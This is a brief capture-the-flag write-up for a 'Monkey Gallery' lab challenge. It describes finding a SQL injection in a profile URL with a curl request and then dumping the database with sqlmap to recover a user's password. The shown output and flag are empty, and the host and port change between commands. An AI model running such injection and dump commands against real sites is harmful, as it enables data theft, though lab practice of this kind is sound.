# Monkey Gallery Challenge 

## Description
The Monkey Gallery is a passion project created by an eccentric zoologist... but rumors say itâ€™s more than just a harmless tribute to primates.

Sources suggest that the gallery's backend was slapped together in a hurry, and not all monkeys were meant to be seen. Some are part of a hidden experiment, and their records are locked deep within a private database table.

**Your mission:**<br>
Can you uncover the truth buried in the database?

Start by investigating how the site loads a monkeyâ€™s profile. Try accessing different monkeys using the URL path: <br>
**http://200.200.200.40:3000/monkey/{id}**

You might notice something odd when you experiment with certain `id` values â€” and maybe, just maybe, you can speak directly to the databaseâ€¦

ðŸŽ¯ Objective: 
Find the password for a mysterious user named "flaghunter" hiding deep within the database.

Good luck. Monkeys are watching.

## **Solution**:
The first thing I did was running this command. It made me realise that I didn't even have to visit the website in a browser... There was SQL injection in the URL.
```bash
curl "http://200.200.200.40:3000/monkey/1'"
```
Since it threw an error. The solution was then to
```bash
sqlmap -u "http://localhost:3390/monkey/1*" --dump --batch
```
Whice gave me this:
```

Apparently, it cracked the user hash itself. So the flag was:
